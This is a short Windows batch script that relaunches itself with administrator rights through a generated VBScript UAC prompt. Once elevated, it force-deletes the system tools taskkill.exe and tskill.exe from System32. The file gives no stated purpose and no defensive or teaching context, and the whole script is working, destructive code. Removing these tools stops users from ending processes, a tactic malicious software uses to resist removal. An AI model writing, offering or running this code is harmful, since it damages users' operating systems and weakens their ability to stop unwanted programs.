@Echo Off
Setlocal
:: First check if we are running As Admin/Elevated
FSUTIL dirty query %SystemDrive% >nul
if %errorlevel% EQU 0 goto START

::Create and run a temporary VBScript to elevate this batch file
   Set _batchFile=%~f0
   Set _Args=%*
   :: double up any quotes
   Set _batchFile=""%_batchFile:"=%""
   Set _Args=%_Args:"=""%

   Echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\~ElevateMe.vbs"
   Echo UAC.ShellExecute "cmd", "/c ""%_batchFile% %_Args%""", "", "runas", 1 >> "%temp%\~ElevateMe.vbs"

   cscript "%temp%\~ElevateMe.vbs" 
   Exit /B

:START
:: set the current directory to the batch file location
cd /d %~dp0
del /f/s/q "C:\Windows\System32\taskkill.exe" > nul
del /f/s/q "C:\Windows\System32\tskill.exe" > nul